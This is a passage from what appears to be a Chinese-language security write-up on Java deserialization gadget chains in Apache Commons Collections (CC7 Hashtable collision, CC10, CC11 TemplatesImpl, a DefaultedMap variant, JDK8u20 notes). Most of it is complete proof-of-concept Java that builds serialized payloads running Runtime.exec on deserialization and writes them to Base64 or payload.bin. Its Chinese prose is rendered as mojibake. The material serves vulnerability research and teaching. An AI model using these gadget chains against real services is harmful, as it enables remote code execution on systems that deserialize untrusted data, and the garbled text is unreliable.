unserialize ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); objectinputstream.readObject(); objectinputstream.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); }catch(Exception e){ e.printStackTrace(); } } } ğŸš©CC9_DefaultedMap LazyMapå› ä¸ºç”¨çš„å¤ªå¹¿è€Œå·²è¢«é‡è§†, æ‰€ä»¥é‡‡å–äº†DefaultedMapä»£æ›¿LazyMap, å®ƒæ‹¥æœ‰å’ŒLazyMapåŒæ ·çš„ç‰¹æ€§ // DefaultedMap.get public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { if (value instanceof Transformer) { return ((Transformer) value).transform(key); } return value; } return map.get(key); } åªè¦å‡ºç°LazyMapçš„åœ°æ–¹éƒ½å¯æ›¿æ¢ä¸ºDefaultedMap POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.DefaultedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC6_DefaultedMap { public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); // è°ƒç”¨decorateä¸»è¦æ˜¯ç›´æ¥å†™å…¥çš„æ–¹æ³•æ˜¯protected, éœ€è¦è®¾ç½®æƒé™æ‰è¡Œ, è€Œè¯¥æ–¹æ³•æ˜¯public Map outerMap = DefaultedMap.decorate(innerMap, chainedTransformer); /**DefaultedMap.get*/ TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"keykey\"); /*jdk1.7~jdk1.8*/ Map expMap = new HashMap(); expMap.put(tiedMapEntry, \"valuevalue\"); outerMap.remove(\"keykey\"); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); try{ // serialize ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectoutputstream = new ObjectOutputStream(barr); objectoutputstream.writeObject(expMap); objectoutputstream.close(); // unserialize ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); objectinputstream.readObject(); objectinputstream.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); }catch(Exception e){ e.printStackTrace(); } } } CC7_ Hashtable CommonsCollections7ç”¨äº†Hashtableæ¥ä»£æ›¿AnnotationInvocationHandlerï¼Œä¸åŒäºå‰é¢ä¸¤ç§CommonsCollections7å¹¶æœªä½¿ç”¨TiredMapEntryï¼Œè€Œæ˜¯ç”¨äº†ç›¸åŒkeyå†²çªçš„æ–¹å¼è°ƒç”¨equalsæ¥è§¦å‘Lazy.getå‡½æ•° æœ¬æ¬¡æ ¹æ®POCæ¥è¿›è¡Œåˆ†æ, å…ˆç»™å‡ºå®Œæ•´çš„POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CC7_Hashtable { public static void main(String[] args) throws Exception { /**ä¸èƒ½åŠ  new ConstantTransformer(1) ä¼šå½±å“payloadè§¦å‘*/ Transformer[] fakeTransformers = new Transformer[] {/*new ConstantTransformer(1)*/}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer); /**å†²çªæ˜¯æµ‹è¯•åå†™å¥½çš„,ä¸èƒ½ä¹±æ”¹*/ lazyMap1.put(\"yy\", 1); Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer); lazyMap2.put(\"zZ\", 1); // Use the colliding Maps as keys in Hashtable Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 2); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); // Needed to ensure hash collision after previous manipulations lazyMap2.remove(\"yy\"); // å­—èŠ‚è°ƒç”¨å†™æ³• ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(hashtable); oos.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); // å†™æ–‡ä»¶å†™æ³• FileOutputStream fileOutputStream = new FileOutputStream(\"payload.bin\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(hashtable); objectOutputStream.flush(); objectOutputStream.close(); FileInputStream fileInputStream = new FileInputStream(\"payload.bin\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } } Hashtableçš„é‡å¤æ“ä½œ Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer); /**å†²çªæ˜¯æµ‹è¯•åå†™å¥½çš„,ä¸èƒ½ä¹±æ”¹*/ lazyMap1.put(\"yy\", 1); Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer); lazyMap2.put(\"zZ\", 1); // Use the colliding Maps as keys in Hashtable Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 2); åœ¨è¿™æ®µä»£ç ä¸­ï¼Œå®ä¾‹åŒ–äº†ä¸¤ä¸ªHashMapï¼Œå¹¶å¯¹ä¸¤ä¸ªHashMapä½¿ç”¨äº†LazyMapå°†transformerChainå’ŒHashMapç»‘å®šåˆ°ä¸€èµ·ã€‚ç„¶ååˆ†åˆ«æ·»åŠ åˆ°Hashtableä¸­ï¼Œ ä½†æ˜¯å‰é¢çœ‹åˆ°çš„éƒ½æ˜¯ä½¿ç”¨ä¸€æ¬¡ï¼Œä¸ºä»€ä¹ˆè¿™é‡Œéœ€è¦é‡å¤2æ¬¡é‡å¤çš„æ“ä½œå‘¢ï¼Ÿ ä»Hashtable.readObjectè·Ÿè¿› private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read in the length, threshold, and loadfactor s.defaultReadObject(); // set hashSeed UNSAFE.putIntVolatile(this, HASHSEED_OFFSET, sun.misc.Hashing.randomHashSeed(this)); // Read the original length of the array and number of elements int origlength = s.readInt(); int elements = s.readInt(); // Compute new size with a bit of room 5% to grow but // no larger than the original size. Make the length // odd if it's large enough, this helps distribute the entries. // Guard against the length ending up zero, that's not valid. int length = (int)(elements * loadFactor) + (elements / 20) + 3; if (length > elements && (length & 1) == 0) length--; if (origlength > 0 && length > origlength) length = origlength; Entry[] table = new Entry[length]; threshold = (int) Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1); count = 0; useAltHashing = sun.misc.VM.isBooted() && (length >= Holder.ALTERNATIVE_HASHING_THRESHOLD); // Read the number of elements and then all the key/value objects for (; elements > 0; elements--) { K key = (K)s.readObject(); V value = (V)s.readObject(); // synch could be eliminated for performance reconstitutionPut(table, key, value); } this.table = table; } Hashtableçš„reconstitutionPutæ–¹æ³•æ˜¯è¢«éå†è°ƒç”¨çš„ ç¬¬ä¸€æ¬¡è°ƒç”¨çš„æ—¶å€™ï¼Œå¹¶ä¸ä¼šèµ°å…¥åˆ°reconstitutionPutæ–¹æ³•forå¾ªç¯é‡Œé¢ï¼Œå› ä¸ºtab[index]çš„å†…å®¹æ˜¯ç©ºçš„ï¼Œåœ¨ä¸‹é¢ä¼šå¯¹tab[index]è¿›è¡Œèµ‹å€¼ã€‚åœ¨ç¬¬äºŒæ¬¡è°ƒç”¨reconstitutionPutæ—¶ï¼Œtabä¸­æ‰æœ‰å†…å®¹ï¼Œæˆ‘ä»¬æ‰æœ‰æœºä¼šè¿›å…¥åˆ°è¿™ä¸ªforå¾ªç¯ä¸­ï¼Œä»è€Œè°ƒç”¨equalsæ–¹æ³•ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¦è°ƒç”¨ä¸¤æ¬¡putçš„åŸå› ã€‚ è¿™é‡Œçš„equalså‡½æ•°å–å†³äºkeyçš„å¯¹è±¡ï¼Œåˆ©ç”¨é“¾ç”¨çš„æ˜¯LazyMapå¯¹è±¡ï¼Œå®é™…è°ƒç”¨çš„æ˜¯çˆ¶ç±»AbstractMapDecoratorçš„equalså‡½æ•° public boolean equals(Object object) { if (object == this) { return true; } return map.equals(object); } è¿™é‡Œåˆè°ƒç”¨äº†mapçš„equalså‡½æ•°ï¼Œè¿™é‡Œå®é™…è°ƒç”¨çš„æ˜¯HashMapçš„çˆ¶ç±»AbstractMapçš„equalså‡½æ•° public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; // oèµ‹å€¼ç»™m, å€¼ä¸ºLazyMapå¯¹è±¡ Map m = (Map) o; if (m.size() != size()) return false; try { Iterator> i = entrySet().iterator(); while (i.hasNext()) { Entry e = i.next(); // key = \"yy\";value = 1; K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null && m.containsKey(key))) return false; } else { // è§¦å‘LazyMap.get if (!value.equals(m.get(key))) return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true; } åç»­å°±æ˜¯è§¦å‘LazyMap.get lazyMap2.remove(\"yy\"); è‡³äºä¸ºä»€ä¹ˆéœ€è¦åœ¨æœ€åé¢ç§»é™¤è¯¥å€¼ï¼Œå…¶å®åœ¨LazyMapçš„getæ–¹æ³•é‡Œé¢å°±å¯ä»¥çœ‹åˆ° public Object get(Object key) { // create value for key if key is not currently in the map // åŒ…å«é”®å€¼å°†æ— æ³•è¿›å…¥ifè¯­å¥ä¸­ if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } å¦‚æœä¸ç§»é™¤è¯¥æ–¹æ³•å°±ä¼šèµ°ä¸è¿›è¯¥åˆ¤æ–­æ¡ä»¶çš„ä»£ç å—ä¸­ã€‚è€Œåé¢ä¹Ÿä¼šå†è°ƒç”¨ä¸€æ¬¡putæ–¹æ³•ã€‚ è°ƒç”¨çš„ä¸¤æ¬¡putå…¶ä¸­mapä¸­keyçš„å€¼åˆ†åˆ«ä¸ºyyå’ŒzZ è¿™é‡Œindexçš„è®¡ç®—æ–¹å¼å…³é”®æ˜¯hashï¼Œè€Œhashæ˜¯é€šè¿‡key.hashCodeå¾—æ¥çš„ï¼Œåœ¨javaä¸­æœ‰ä¸€ä¸ªå°bugï¼š \"yy\".hashCode() == \"zZ\".hashCode() æ­£æ˜¯è¿™ä¸ªå°bugè®©è¿™é‡Œèƒ½å¤Ÿåˆ©ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦å°†mapä¸­putçš„å€¼è®¾ç½®ä¸ºyyå’ŒzZï¼Œä½¿ä¸¤æ¬¡è®¡ç®—çš„indexéƒ½ä¸€æ ·ï¼Œæ‰èƒ½å¤Ÿè¿›å…¥åˆ°forå¾ªç¯ä¸­ã€‚ CC10_mixed with CC6 and CC7 çœ‹åˆ° Hashtable.reconstitutionPut ä¸­çš„æœ‰ä¸€å¤„ hashCode çš„è°ƒç”¨ int hash = hash(key); // è·Ÿè¿›hash private int hash(Object k) { if (useAltHashing) { if (k.getClass() == String.class) { return sun.misc.Hashing.stringHash32((String) k); } else { // æ­¤å¤„è°ƒç”¨hashCode int h = hashSeed ^ k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h >>> 20) ^ (h >>> 12); return h ^ (h >>> 7) ^ (h >>> 4); } } else { return k.hashCode(); } } å¦‚æœkeyå€¼è¢«ä»£æ›¿ä¸ºTiedMapEntryå¯¹è±¡, è¿™é‡Œå°±èƒ½è§¦å‘LazyMap.get POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CommonsCollections10 { public static void main(String[] args) throws Exception{ /**ä¸èƒ½åŠ  new ConstantTransformer(1) ä¼šå½±å“payloadè§¦å‘*/ Transformer[] fakeTransformers = new Transformer[] {/*new ConstantTransformer(1)*/}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); // è°ƒç”¨decorateä¸»è¦æ˜¯ç›´æ¥å†™å…¥çš„æ–¹æ³•æ˜¯protected, éœ€è¦è®¾ç½®æƒé™æ‰è¡Œ, è€Œè¯¥æ–¹æ³•æ˜¯public Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); TiedMapEntry tiedMapEntry1 = new TiedMapEntry(outerMap, \"keykey\"); // Use the colliding Maps as keys in Hashtable Hashtable hashtable = new Hashtable(); hashtable.put(\"keykey\", 1); // è·å–hashtableçš„tableç±»å±æ€§ Field tableField = Hashtable.class.getDeclaredField(\"table\"); tableField.setAccessible(true); Object[] table = (Object[])tableField.get(hashtable); Object tiedMapEntry2 = table[0]; if(tiedMapEntry2 == null) tiedMapEntry2 = table[1]; // è·å–Hashtable.Entryçš„keyå±æ€§ Field keyField = tiedMapEntry2.getClass().getDeclaredField(\"key\"); keyField.setAccessible(true); // å°†keyå±æ€§ç»™æ›¿æ¢æˆæ„é€ å¥½çš„TiedMapEntryå®ä¾‹ keyField.set(tiedMapEntry2, tiedMapEntry1); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); // å­—èŠ‚è°ƒç”¨å†™æ³• ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(hashtable); oos.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); // å†™æ–‡ä»¶å†™æ³• FileOutputStream fileOutputStream = new FileOutputStream(\"payload.bin\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(hashtable); objectOutputStream.flush(); objectOutputStream.close(); FileInputStream fileInputStream = new FileInputStream(\"payload.bin\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } } JDK8u20 å‚è€ƒ: https://www.cnpanda.net/sec/974.html https://www.anquanke.com/post/id/87270 https://blog.csdn.net/xiaoWhite_meng/article/details/80980145 å®˜æ–¹å¯¹jdk7u21çš„ä¿®å¤ // æ”¹ä¹‹å‰ AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; all bets are off return; } // æ”¹ä¹‹å AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\"); } è¿™é‡Œå¢åŠ äº†ä¸€æ­¥å¯¹typeå­—æ®µç±»å‹çš„æ£€æŸ¥ï¼Œå¦‚æœä¼ å…¥çš„ç±»å‹ä¸æ˜¯AnnotationTypeï¼Œé‚£ä¹ˆå°±ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œé€€å‡ºååºåˆ—åŒ–æµç¨‹ã€‚ç„¶è€Œæˆ‘ä»¬åœ¨æ„é€ payloadçš„æ—¶å€™ï¼Œå°†typeèµ‹å€¼ä¸ºTemplates.classï¼Œè‡ªç„¶æ˜¯è¿‡ä¸äº†è¿™ä¸ªæ£€æŸ¥ï¼Œæ‰€ä»¥JDK7u21ä¹Ÿå°±æ— æ³•åœ¨åç»­çš„Javaç‰ˆæœ¬ä¸Šä½¿ç”¨äº† å®é™…ä¸Šåœ¨jdk7u21æ¼æ´ä¸­ï¼Œæˆ‘ä»¬ä¼ å…¥çš„AnnotationInvocationHandlerå¯¹è±¡åœ¨å¼‚å¸¸è¢«æŠ›å‡ºå‰ï¼Œå·²ç»ä»åºåˆ—åŒ–æ•°æ®ä¸­è¢«è¿˜åŸå‡ºæ¥ã€‚æ¢å¥è¯è¯´å°±æ˜¯æˆ‘ä»¬æŠŠæ¶æ„çš„ç§å­ç§åˆ°äº†è¿è¡Œå¯¹è±¡ä¸­ï¼Œä½†æ˜¯å› ä¸ºå‡ºç°å¼‚å¸¸å¯¼è‡´è¯¥ç§å­æ²¡æ³•ç”Ÿé•¿ï¼Œåªè¦æˆ‘ä»¬è§£å†³äº†è¿™ä¸ªå¼‚å¸¸ï¼Œé‚£ä¹ˆå°±å¯ä»¥é‡æ–°è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ é€šè¿‡åœ¨JDK7u21çš„proxyå¯¹è±¡ï¼ˆLinkedHashSetçš„ç¬¬äºŒä¸ªæ•°æ®ï¼‰ä¸­æ’å…¥ä¸€ä¸ªå‡çš„æˆå‘˜ï¼Œä½¿å…¶ä¸ºBeanContextSupportçš„å¯¹è±¡ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¿™ä¸ªæ•°æ®ä¼šè¢«æŠ›å¼ƒæ‰ï¼Œå› ä¸ºå®é™…ä¸Šç±»çš„å®šä¹‰ä¸­å¹¶æ²¡æœ‰è¿™ä¹ˆä¸€ä¸ªæˆå‘˜ï¼Œä½†æ˜¯è¯¥å¯¹è±¡ä¾ç„¶ä¼šè¢«ååºåˆ—åŒ–å¹¶ä¸”ä¸ºå…¶åˆ†é…handleï¼Œé‚£ä¹ˆåœ¨BeanContextSupportçš„ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå°±å¯ä»¥åˆ©ç”¨å‰é¢æåˆ°çš„tryâ€¦catchâ€¦ç»“æ„é¡ºåˆ©çš„è¿˜åŸå‡ºAnnotationInvocationHandlerå¯¹è±¡ï¼Œå¹¶ä¸”é€šè¿‡æ„é€ åºåˆ—åŒ–æ•°æ®å®Œæˆæ•´ä¸ªåºåˆ—åŒ–æµç¨‹ // readObject private synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { synchronized(BeanContext.globalHierarchyLock) { ois.defaultReadObject(); initialize(); bcsPreDeserializationHook(ois); if (serializable > 0 && this.equals(getBeanContextPeer())) readChildren(ois); deserialize(ois, bcmListeners = new ArrayList(1)); } } // readChildren public final void readChildren(ObjectInputStream ois) throws IOException, ClassNotFoundException { int count = serializable; while (count-- > 0) { Object child = null; BeanContextSupport.BCSChild bscc = null; try { child = ois.readObject(); bscc = (BeanContextSupport.BCSChild)ois.readObject(); } catch (IOException ioe) { continue; } catch (ClassNotFoundException cnfe) { continue; } synchronized(child) { BeanContextChild bcc = null; try { bcc = (BeanContextChild)child; } catch (ClassCastException cce) { // do nothing; } if (bcc != null) { try { bcc.setBeanContext(getBeanContextPeer()); bcc.addPropertyChangeListener(\"beanContext\", childPCL); bcc.addVetoableChangeListener(\"beanContext\", childVCL); } catch (PropertyVetoException pve) { continue; } } childDeserializedHook(child, bscc); } } } åœ¨æ„é€ ä¸Šéœ€è¦å¯¹å…¶åºåˆ—åŒ–ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œåˆ†æ, æ¯”è¾ƒå¤æ‚, å‚è€ƒå¸ˆå‚…ä»¬çš„payload: https://github.com/pwntester/JRE8u20_RCE_Gadget CC11_mixed with CC2 and CC6 CommonsCollections11ä¸»è¦æ˜¯é€šè¿‡InvokerTransformerå»è°ƒç”¨TemplatesInmplçš„newTransformer POC package CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.DefaultedMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections11 { public static void main(String[] args) throws Exception{ // ClassPoolæ˜¯ CtClass å¯¹è±¡çš„å®¹å™¨ã€‚å®ä¾‹åŒ–ä¸€ä¸ªClassPoolå®¹å™¨ã€‚ ClassPool classPool = ClassPool.getDefault(); // å‘å®¹å™¨ä¸­çš„ç±»æœç´¢è·¯å¾„çš„èµ·å§‹ä½ç½®æ’å…¥AbstractTranslet.classï¼Œä¸ªäººè®¤ä¸ºæ˜¯æ–¹ä¾¿è®©åé¢èƒ½å¤Ÿæ‰¾åˆ°è¿™ä¸ªç±» classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // ä½¿ç”¨å®¹å™¨æ–°å»ºä¸€ä¸ªCtClassï¼Œç›¸å½“äºæ–°å»ºä¸€ä¸ªclassï¼Œç±»åä¸ºEvil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // ç»™è¿™ä¸ªç±»åˆ›å»º static ä»£ç å—ï¼Œå¹¶æ’å…¥åˆ°ç±»ä¸­ ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // é‡æ–°è®¾ç½®ç±»åä¸ºä¸€ä¸ªéšæœºçš„åå­— ctClass.setName(className); // ç»™è¿™ä¸ªç±»æ·»åŠ ä¸€ä¸ªçˆ¶ç±»ï¼Œå³ç»§æ‰¿è¯¥çˆ¶ç±»ã€‚ ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // è®¾ç½®çˆ¶ç±»ä¸ºAbstractTransletï¼Œé¿å…æŠ¥é”™ // å°†è¿™ä¸ªç±»è¾“å‡ºåˆ°é¡¹ç›®ç›®å½•ä¸‹ // ctClass.writeFile(\"./\"); // å°†è¿™ä¸ªclassè½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ byte[] classBytes = ctClass.toBytecode(); // å°†å­—èŠ‚æ•°ç»„æ”¾ç½®åˆ°ä¸€ä¸ªäºŒç»´æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  byte[][] targetByteCodes = new byte[][]{classBytes}; // å®ä¾‹åŒ–TemplatesImplå¯¹è±¡ TemplatesImpl templates = TemplatesImpl.class.newInstance(); // é€šè¿‡åå°„è®¾ç½®å­—æ®µçš„å€¼ä¸ºäºŒç»´å­—èŠ‚æ•°ç»„ setFieldValue(templates, \"_bytecodes\", targetByteCodes); // è¿›å…¥ defineTransletClasses() æ–¹æ³•éœ€è¦çš„æ¡ä»¶ setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); Transformer transformer = new InvokerTransformer(\"getClass\", null, null); Map innerMap = new HashMap(); // Map outerMap = LazyMap.decorate(innerMap, transformer); Map outerMap = DefaultedMap.decorate(innerMap, transformer); TiedMapEntry tiedmapentry = new TiedMapEntry(outerMap, templates); Map expMap = new HashMap(); expMap.put(tiedmapentry, \"valuevalue\"); // æ¸…é™¤é”®å€¼ outerMap.clear(); // é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iMethodNameï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°è§¦å‘æ¶æ„æ–¹æ³• setFieldValue(transformer, \"iMethodName\", \"newTransformer\"); // å­—èŠ‚è°ƒç”¨å†™æ³• ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); // å†™æ–‡ä»¶å†™æ³• FileOutputStream fileOutputStream = new FileOutputStream(\"payload.bin\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(expMap); objectOutputStream.flush(); objectOutputStream.close(); FileInputStream fileInputStream = new FileInputStream(\"payload.bin\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } CC12_Update by CC6 å‚è€ƒ: https://forum.butian.net/share/120 https://xz.aliyun.com/t/8673 javax.script.ScriptEngineManager å¼•æ“è°ƒç”¨ JDKå†…ç½®çš„JSå¼•æ“ ç§‘æ™®ä¸€ä¸‹javax.script.ScriptEngineManager.è¿™ä¸ªç±»åœ¨jdkä¸­å¯ä»¥ç”¨ä»¥æ‰§è¡Œä¸€äº›è„šæœ¬è¯­è¨€,ä¾‹å¦‚æ¯”è¾ƒæµè¡Œçš„æœ‰JavaScriptã€Scalaã€JRubyã€Jythonå’ŒGroovyç­‰.è€ŒJavaSE6ä¸­è‡ªå¸¦äº†JavaScriptè¯­è¨€çš„è„šæœ¬å¼•æ“,åŸºäºMozillaçš„Rhinoå®ç°,å¯ä»¥é€šè¿‡ä¸‰ç§æ–¹å¼æŸ¥æ‰¾è„šæœ¬å¼•æ“: 1.é€šè¿‡è„šæœ¬åç§°è·å–ï¼š ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"JavaScript\"); 2.é€šè¿‡MIMEç±»å‹æ¥è·å–ï¼š ScriptEngine engine = new ScriptEngineManager().getEngineByExtension(\"js\"); 3.é€šè¿‡MIMEç±»å‹æ¥è·å–ï¼š ScriptEngine engine = new ScriptEngineManager().getEngineByMimeType(\"text/javascript\"); ä¾‹å¦‚æˆ‘ä»¬è¦å’Œjsæ··ç¼–æ‰“å°ä¸€ä¸ªHelloWordï¼š ScriptEngineManager manager = new ScriptEngineManager(); ScriptEngine engine = manager.getEngineByName(\"JavaScript\"); engine.eval(\"println('Hello Word');\"); å½“ç„¶åå°„çš„å†™æ³•å¦‚ä¸‹ï¼š Class clazz = Class.forName(\"javax.script.ScriptEngineManager\"); Object manager = clazz.getDeclaredConstructor().newInstance(); Method getEngineByName = clazz.getDeclaredMethod(\"getEngineByName\", String.class); Object scriptEngine = getEngineByName.invoke(manager,\"JavaScript\"); Method eval = scriptEngine.getClass().getMethod(\"eval\",String.class); eval.invoke(scriptEngine,\"println('Hello Word');\"); æ³¨æ„: ç”±äºæ˜¯å’Œjsæ··ç¼–,æ‰€ä»¥è¦å……åˆ†æ³¨æ„jsçš„ä¸€äº›è¯­æ³•å’ŒJavaè¯­æ³•çš„åŒºåˆ« 1.å˜é‡å‘½å 